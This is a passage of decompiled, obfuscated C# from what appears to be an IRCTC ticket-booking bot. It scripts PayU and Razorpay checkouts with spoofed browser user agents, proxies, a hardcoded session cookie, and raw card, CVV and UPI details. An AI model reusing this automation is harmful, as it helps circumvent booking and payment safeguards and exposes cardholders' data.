                    postdata = "key=" + text11 + "&productinfo=IRCTC+TICKET&hash=" + text14 + "&txnid=" + text12 + "&amount=" + text13 + "&firstname=IrctcCustomer&email=IrctcCustomer%40example.com&phone=9999999999&surl=https%3A%2F%2Fpayments.payu.in%2FIrctc&furl=https%3A%2F%2Fpayments.payu.in%2FIrctc&udf1=0&udf2=UPI&curl=https%3A%2F%2Fpayments.payu.in%2FIrctc&enforce_paymethod=upi";
                    if (clsMain.LoginType == "APP")
                    {
                        postdata = "key=" + text11 + "&productinfo=IRCTC+TICKET&hash=" + text14 + "&txnid=" + text12 + "&amount=" + text13 + "&firstname=IrctcCustomer&email=IrctcCustomer@example.com&phone=9999999999&surl=https%3A%2F%2Findusirctc.payu.in%2FIndusIrctcPayment&furl=https%3A%2F%2Findusirctc.payu.in%2FIndusIrctcPayment&curl=https%3A%2F%2Findusirctc.payu.in%2FIndusIrctcPayment&udf2=UPI&enforce_paymethod=upi";
                    }
                }
                dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                stopwatch_0 = new Stopwatch();
                stopwatch_0.Restart();
                string_92 = "https://secure.payu.in/_payment";
                bool_11 = true;
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Connect" + text8 + "(2/6)", tCntrlName_, null, null);
                }
                Reffral = "https://indusirctc.payu.in/";

                Cookie cookie2 = new Cookie("PAYUID", "35206c93d8c303d359a73477ccf1f986")
                {
                    Domain = ".secure.payu.in",
                    Secure = Convert.ToBoolean("true")
                };

                cookieContainer_1.Add(cookie2);
                //text10 += array12[3];
                cookieContainer_1.Add(cookie2);
                if (!_Request_Indus(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                if (!string.IsNullOrEmpty(string_16))
                {
                    string[] array2 = string_16.Split(new string[1] { "=" }, StringSplitOptions.None);
                    Reffral = string_92;
                    Reffral = "https://indusirctc.payu.in/";
                    string_92 = string_16;
                    string text15 = array2[1];
                    text15 = text15.Replace("&userToken", "");
                    if (!_Request_Indus(string_92, "", Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Process " + text8 + "(3/6)", tCntrlName_, null, null);
                    }
                    Reffral = string_92;
                    string_92 = "https://api.payu.in/checkoutx?paymentId=" + text15;
                    if (!_Request(string_92, "", Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    string @string = GetString(response, "accessToken");
                    if (string_88.Contains("BHIMUPI") | string_88.Contains("PHONEPE") | string_88.Contains("INDUSUPI"))
                    {
                        string_92 = "https://api.payu.in/utilities/vpas/" + text2 + "/validate?paymentId=" + text15 + "&access_token=" + @string + "&ibiboCode=UPI&userToken=";
                        if (!_Request(string_92, "", Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            bool flag = false;
                        }
                        string string2 = GetString(response, "payerAccountName");
                        postdata = "{\"window3DUsed\":false,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\",\"name\":\"UPI\",\"bankCode\":\"UPI\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\",\"broker\":\"PAYU\",\"baseMihpayid\":\"" + text15 + "\",\"additionalFields\":{\"upiAppName\":\"generic\",\"language\":\"en\"},\"vpa\":\"" + text2 + "\",\"upiPayerAccountName\":\"" + string2 + "\"}";
                        string_92 = "https://api.payu.in/checkoutx/payments";
                        bool_29 = true;
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        DateTime dateTime = DateTime.Now.AddSeconds(92.0);
                        if (string_87.Contains("@axisbank"))
                        {
                            while (frmUPI.payStart)
                            {
                                Application.DoEvents();
                                Thread.Sleep(100);
                            }
                            updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                            frmUPI.payStart = true;
                            Application.DoEvents();
                            Thread.Sleep(1000);
                            while (frmUPI.payStart)
                            {
                                Application.DoEvents();
                                Thread.Sleep(100);
                                if (DateTime.Now > dateTime)
                                {
                                    break;
                                }
                            }
                        }
                        else
                        {
                            updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
                        }
                        string_92 = "https://secure.payu.in/response?mihpayid=" + text15;
                        do
                        {
                            if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            string text16 = response.Substring(response.IndexOf("name=\"status") + 21);
                            string text17 = text16.Substring(0, text16.IndexOf("\""));
                            if (text17 == "pending")
                            {
                                Thread.Sleep(1000);
                                continue;
                            }
                            break;
                        }
                        while (!(DateTime.Now > dateTime));
                        postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        string_91 = string_92;
                        string_90 = response;
                        return true;
                    }
                    postdata = "{\"window3DUsed\":false,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\",\"name\":\"NetBanking\",\"bankCode\":\"" + text + "\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\",\"broker\":\"PAYU\"}";
                    if (string_88.Contains("_DC") || string_88.Contains("_CC"))
                    {
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Process Start " + text8 + "(4/6)", tCntrlName_, null, null);
                        }
                        string text18 = text2.Substring(0, 6);
                        postdata = "{\"mcpEligibleFlag\":1,\"mcpCurrencyOrder\":\"USD,EUR,CAD,AED,GBP,AUD,SGD,INR\",\"merchantBaseCurrency\":\"INR\",\"bin\":\"" + text18 + "\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\"}";
                        string_92 = "https://api.payu.in/bin/binBasedDetails";
                        bool_29 = true;
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        string string3 = GetString(response, "bankCode");
                        GetString(response, "issuingBank");
                        GetString(response, "category");
                        postdata = "{\"window3DUsed\":false,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\",\"name\":\"DebitCard\",\"bankCode\":\"" + string3 + "\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\",\"broker\":\"PAYU\",\"cardNumber\":\"" + text2 + "\",\"cvv\":\"" + text5 + "\",\"validThrough\":\"" + text3 + "/" + text4 + "\",\"storeCard\":false,\"ownerName\":\"" + text6 + "\"}";
                    }
                    Reffral = string_92;
                    string_92 = "https://api.payu.in/payments";
                    bool_40 = true;
                    bool_29 = true;
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Process Start " + text8 + "(4/6)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    byte[] bytes = Convert.FromBase64String(GetString(response, "acsTemplate"));
                    response = Encoding.UTF8.GetString(bytes);
                    bool flag2 = false;
                    if (text7 == "45")
                    {
                        while (clsMain.bool_12)
                        {
                            Thread.Sleep(500);
                        }
                        clsMain.bool_12 = true;
                    }
                    switch (text7)
                    {
                        case "60":
                            flag2 = method_130(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, ref response, ref string_91, updateTStatus_2);
                            break;
                        case "KOTAK_DC":
                            if (updateTStatus_1 != null)
                            {
                                updateTStatus_1.BeginInvoke(1, "Init. " + text8 + "(3/6)", tCntrlName_, null, null);
                            }
                            postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                            if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            flag2 = true;
                            break;
                        case "52":
                            flag2 = method_117(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            break;
                        case "1":
                            {
                                CookieContainer cookieContainer_ = null;
                                if (!(flag2 = SbiNetBanking(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2, ref cookieContainer_)) && cookieContainer_ != null)
                                {
                                    ThreadPool.QueueUserWorkItem(method_110, cookieContainer_);
                                }
                                break;
                            }
                        case "45":
                            flag2 = method_120(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            clsMain.bool_12 = false;
                            break;
                        case "36":
                            flag2 = method_113(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            break;
                        case "44":
                            flag2 = method_116(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            break;
                        case "21":
                            flag2 = method_121(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            break;
                    }
                    if (flag2)
                    {
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Finilizing " + text8 + "(6/6)", tCntrlName_, null, null);
                        }
                        postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        if (response.Contains("https://www.irctc.co.in"))
                        {
                            string_91 = string_92;
                            string_90 = response;
                            return true;
                        }
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Finilizing" + text8, tCntrlName_, null, null);
                        }
                        postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        if (response.Contains("https://www.irctc.co.in"))
                        {
                            string_91 = string_92;
                            string_90 = response;
                            return true;
                        }
                        return result;
                    }
                    return result;
                }
                clsMain.Lock("Getting payment out error= " + response);
                return false;
            }
            catch (Exception ex)
            {
                clsMain.method_74("Process_PayUWeb", ex.Message);
                return false;
            }
        }

        internal bool PayU_(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_RAZ.  DETAILS: ");
            string_86.Contains("razorpay");
            string text = string_88;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text2 = array[0].Trim();
            string text3 = array[1];
            string text4 = "";
            string text5 = "";
            string text6 = "";
            string string_92 = "";
            string text7 = "";
            string text8;
            if (string_88.Contains("_DC") || string_88.Contains("_CC"))
            {
                text8 = "DC";
                text4 = array[2];
                text5 = array[4];
                text6 = array[6];
                if (text3.Length < 2)
                {
                    text3 = "0" + text3;
                }
                if ((text == "HDFC_DC") | text.Contains("HDFC_CC"))
                {
                    text7 = "21";
                }
                else if ((text == "SBI_DC") | text.Contains("SBI_CC"))
                {
                    text7 = "101";
                }
                else if (text.Contains("AIRTEL_CC"))
                {
                    text7 = "102";
                }
                else if (text.Contains("KOTAK_"))
                {
                    text7 = "KOTAK_DC";
                }
            }
            else if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI"))
            {
                text8 = "BHIMUPI";
            }
            else
            {
                text8 = "NB";
                string text9 = text;
                switch (Class46.smethod_0(text9))
                {
                    case 1031356403u:
                        if (text9 == "PAYUHDFC")
                        {
                            text = "HDFB";
                            text7 = "36";
                        }
                        break;
                    case 1005593931u:
                        if (text9 == "SBI")
                        {
                            text = "SBI";
                            text7 = "1";
                        }
                        break;
                    case 1934763940u:
                        if (text9 == "ICICI")
                        {
                            text = "ICICI";
                            text7 = "44";
                        }
                        break;
                    case 1145574292u:
                        if (text9 == "UNION")
                        {
                            text = "UNI";
                            text7 = "28";
                        }
                        break;
                    case 2596969871u:
                        if (text9 == "Razor")
                        {
                            text = "PPI";
                        }
                        break;
                    case 2471879920u:
                        if (text9 == "YES")
                        {
                            text = "YES";
                            text7 = "60";
                        }
                        break;
                    case 4249340199u:
                        if (text9 == "INDUSIND")
                        {
                            text = "INIB";
                            text7 = "45";
                        }
                        break;
                    case 4021309901u:
                        if (text9 == "CORP")
                        {
                            text = "CORP";
                            text7 = "56";
                        }
                        break;
                    case 3504019421u:
                        if (text9 == "IDBI")
                        {
                            text = "IDBI";
                            text7 = "52";
                        }
                        else if (text9 == "AIRTELMONEY")
                        {
                            text = "Air";
                            text7 = "52";
                        }
                        break;
                }
            }
            try
            {
                postdata = class3_0.Method_SerialInp(string_86, ref string_92, false);
                if (clsMain.LoginType == "APP")
                {
                    string_92 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    postdata = "encdata=" + GetString_(string_86, "encdata\",\"value", "\"");
                }
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "PayuMoney Process " + text8 + "(1/6)", tCntrlName_, null, null);
                }
                if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                string text10 = response.Substring(response.IndexOf("key") + 12);
                string text11 = text10.Substring(0, text10.IndexOf("\""));
                text10 = response.Substring(response.IndexOf("txnid") + 14);
                string text12 = text10.Substring(0, text10.IndexOf("\""));
                text10 = response.Substring(response.IndexOf("amount") + 15);
                string text13 = text10.Substring(0, text10.IndexOf("\""));
                text10 = response.Substring(response.IndexOf("hash") + 13);
                string text14 = text10.Substring(0, text10.IndexOf("\""));
                postdata = "key=" + text11 + "&productinfo=IRCTC+TICKET&hash=" + text14 + "&txnid=" + text12 + "&amount=" + text13 + "&firstname=IrctcCustomer&email=IrctcCustomer%40example.com&phone=9999999999&surl=https%3A%2F%2Fpayments.payu.in%2FIrctc&furl=https%3A%2F%2Fpayments.payu.in%2FIrctc&udf1=0&udf2=NOUPI&curl=https%3A%2F%2Fpayments.payu.in%2FIrctc&enforce_paymethod=creditcard%7Cdebitcard%7Cnetbanking%7Ccashcard";
                if (string_88.Contains("BHIMUPI") | string_88.Contains("PHONEPE") | string_88.Contains("PAYUUPI"))
                {
                    postdata = "key=" + text11 + "&productinfo=IRCTC+TICKET&hash=" + text14 + "&txnid=" + text12 + "&amount=" + text13 + "&firstname=IrctcCustomer&email=IrctcCustomer%40example.com&phone=9999999999&surl=https%3A%2F%2Fpayments.payu.in%2FIrctc&furl=https%3A%2F%2Fpayments.payu.in%2FIrctc&udf1=0&udf2=UPI&curl=https%3A%2F%2Fpayments.payu.in%2FIrctc&enforce_paymethod=upi";
                    if (clsMain.LoginType == "APP")
                    {
                        postdata = "key=" + text11 + "&productinfo=IRCTC+TICKET&hash=" + text14 + "&txnid=" + text12 + "&amount=" + text13 + "&firstname=IrctcCustomer&email=IrctcCustomer@example.com&phone=9999999999&surl=https%3A%2F%2Findusirctc.payu.in%2FIndusIrctcPayment&furl=https%3A%2F%2Findusirctc.payu.in%2FIndusIrctcPayment&curl=https%3A%2F%2Findusirctc.payu.in%2FIndusIrctcPayment&udf2=UPI&enforce_paymethod=upi";
                    }
                }
                dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                stopwatch_0 = new Stopwatch();
                stopwatch_0.Restart();
                string_92 = "https://secure.payu.in/_payment";
                bool_11 = true;
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Connect" + text8 + "(2/6)", tCntrlName_, null, null);
                }
                if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                if (!string.IsNullOrEmpty(string_16))
                {
                    string[] array2 = string_16.Split(new string[1] { "#/" }, StringSplitOptions.None);
                    Reffral = string_92;
                    string_92 = array2[0];
                    string text15 = array2[1];
                    if (!_Request(string_92, "", Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Process " + text8 + "(3/6)", tCntrlName_, null, null);
                    }
                    Reffral = string_92;
                    string_92 = "https://api.payu.in/checkoutx?paymentId=" + text15;
                    if (!_Request(string_92, "", Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    string @string = GetString(response, "accessToken");
                    if (string_88.Contains("BHIMUPI") | string_88.Contains("PHONEPE") | string_88.Contains("PAYUUPI"))
                    {
                        string_92 = "https://api.payu.in/utilities/vpas/" + text2 + "/validate?paymentId=" + text15 + "&access_token=" + @string + "&ibiboCode=UPI&userToken=";
                        if (!_Request(string_92, "", Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            bool flag = false;
                        }
                        string string2 = GetString(response, "payerAccountName");
                        postdata = "{\"window3DUsed\":false,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\",\"name\":\"UPI\",\"bankCode\":\"UPI\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\",\"broker\":\"PAYU\",\"baseMihpayid\":\"" + text15 + "\",\"additionalFields\":{\"upiAppName\":\"generic\",\"language\":\"en\"},\"vpa\":\"" + text2 + "\",\"upiPayerAccountName\":\"" + string2 + "\"}";
                        string_92 = "https://api.payu.in/checkoutx/payments";
                        bool_29 = true;
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        DateTime dateTime = DateTime.Now.AddSeconds(92.0);
                        if (string_87.Contains("@axisbank"))
                        {
                            while (frmUPI.payStart)
                            {
                                Application.DoEvents();
                                Thread.Sleep(100);
                            }
                            updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                            frmUPI.payStart = true;
                            Application.DoEvents();
                            Thread.Sleep(1000);
                            while (frmUPI.payStart)
                            {
                                Application.DoEvents();
                                Thread.Sleep(100);
                                if (DateTime.Now > dateTime)
                                {
                                    break;
                                }
                            }
                        }
                        else
                        {
                            updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
                        }
                        string_92 = "https://secure.payu.in/response?mihpayid=" + text15;
                        do
                        {
                            if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            string text16 = response.Substring(response.IndexOf("name=\"status") + 21);
                            string text17 = text16.Substring(0, text16.IndexOf("\""));
                            if (text17 == "pending")
                            {
                                Thread.Sleep(1000);
                                continue;
                            }
                            break;
                        }
                        while (!(DateTime.Now > dateTime));
                        postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        string_91 = string_92;
                        string_90 = response;
                        return true;
                    }
                    postdata = "{\"window3DUsed\":false,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\",\"name\":\"NetBanking\",\"bankCode\":\"" + text + "\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\",\"broker\":\"PAYU\"}";
                    if (string_88.Contains("_DC") || string_88.Contains("_CC"))
                    {
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Process Start " + text8 + "(4/6)", tCntrlName_, null, null);
                        }
                        string text18 = text2.Substring(0, 6);
                        postdata = "{\"mcpEligibleFlag\":1,\"mcpCurrencyOrder\":\"USD,EUR,CAD,AED,GBP,AUD,SGD,INR\",\"merchantBaseCurrency\":\"INR\",\"bin\":\"" + text18 + "\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\"}";
                        string_92 = "https://api.payu.in/bin/binBasedDetails";
                        bool_29 = true;
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        string string3 = GetString(response, "bankCode");
                        GetString(response, "issuingBank");
                        GetString(response, "category");
                        postdata = "{\"window3DUsed\":false,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\",\"name\":\"DebitCard\",\"bankCode\":\"" + string3 + "\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\",\"broker\":\"PAYU\",\"cardNumber\":\"" + text2 + "\",\"cvv\":\"" + text5 + "\",\"validThrough\":\"" + text3 + "/" + text4 + "\",\"storeCard\":false,\"ownerName\":\"" + text6 + "\"}";
                    }
                    Reffral = string_92;
                    string_92 = "https://api.payu.in/payments";
                    bool_40 = true;
                    bool_29 = true;
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Process Start " + text8 + "(4/6)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    byte[] bytes = Convert.FromBase64String(GetString(response, "acsTemplate"));
                    response = Encoding.UTF8.GetString(bytes);
                    bool flag2 = false;
                    if (text7 == "45")
                    {
                        while (clsMain.bool_12)
                        {
                            Thread.Sleep(500);
                        }
                        clsMain.bool_12 = true;
                    }
                    switch (text7)
                    {
                        case "60":
                            flag2 = method_130(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, ref response, ref string_91, updateTStatus_2);
                            break;
                        case "KOTAK_DC":
                            if (updateTStatus_1 != null)
                            {
                                updateTStatus_1.BeginInvoke(1, "Init. " + text8 + "(3/6)", tCntrlName_, null, null);
                            }
                            postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                            if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            flag2 = true;
                            break;
                        case "52":
                            flag2 = method_117(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            break;
                        case "1":
                            {
                                CookieContainer cookieContainer_ = null;
                                if (!(flag2 = SbiNetBanking(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2, ref cookieContainer_)) && cookieContainer_ != null)
                                {
                                    ThreadPool.QueueUserWorkItem(method_110, cookieContainer_);
                                }
                                break;
                            }
                        case "45":
                            flag2 = method_120(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            clsMain.bool_12 = false;
                            break;
                        case "36":
                            flag2 = method_113(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            break;
                        case "44":
                            flag2 = method_116(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            break;
                        case "21":
                            flag2 = method_121(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                            break;
                    }
                    if (flag2)
                    {
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Finilizing " + text8 + "(6/6)", tCntrlName_, null, null);
                        }
                        postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        if (response.Contains("https://www.irctc.co.in"))
                        {
                            string_91 = string_92;
                            string_90 = response;
                            return true;
                        }
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Finilizing" + text8, tCntrlName_, null, null);
                        }
                        postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                        if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        if (response.Contains("https://www.irctc.co.in"))
                        {
                            string_91 = string_92;
                            string_90 = response;
                            return true;
                        }
                        return result;
                    }
                    return result;
                }
                clsMain.Lock("Getting payment out error= " + response);
                return false;
            }
            catch (Exception ex)
            {
                clsMain.method_74("Process_PayUWeb", ex.Message);
                return false;
            }
        }

        internal bool Razorpay(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            class3_0.LoginType = "WEB";
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_RAZ.  DETAILS: ");
            string_86.Contains("razorpay");
            bool flag = false;
            string text = string_88;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text2 = array[0].Trim();
            string text3 = array[1];
            string text4 = "";
            string text5 = "";
            string text6 = "";
            string text7 = "";
            string string_92 = "";
            string text8;
            if (string_88.Contains("_DC") || string_88.Contains("_CC"))
            {
                text8 = "DC";
                text4 = array[2];
                text5 = array[4];
                text6 = array[6];
                text7 = array[7];
                if (text3.Length < 2)
                {
                    text3 = "0" + text3;
                }
                if (!((text == "HDFC_DC") | text.Contains("HDFC_CC")))
                {
                    if (text == "AXIS_DC")
                    {
                        return method_156(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                    }
                    if (!((text == "SBI_DC") | text.Contains("SBI_CC")) && text.Contains("AIRTEL_CC"))
                    {
                    }
                }
            }
            else
            {
                if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE"))
                {
                    return method_157(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                }
                text8 = "NB";
                string text9 = text;
                switch (Class46.smethod_0(text9))
                {
                    case 1934763940u:
                        if (text9 == "ICICI")
                        {
                        }
                        break;
                    case 1145574292u:
                        if (text9 == "UNION")
                        {
                        }
                        break;
                    case 1005593931u:
                        if (text9 == "SBI")
                        {
                        }
                        break;
                    case 2970694650u:
                        if (text9 == "HDFC")
                        {
                        }
                        break;
                    case 2596969871u:
                        if (text9 == "Razor")
                        {
                        }
                        break;
                    case 4021309901u:
                        if (text9 == "CORP")
                        {
                        }
                        break;
                }
            }
            bool result;
            try
            {
                postdata = class3_0.Method_SerialInp(response, ref url, false);
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text8 + "(1/6)", tCntrlName_, null, null);
                }
                string_52 = "Tls12";
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    result = false;
                }
                else
                {
                    dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                    stopwatch_0.Restart();
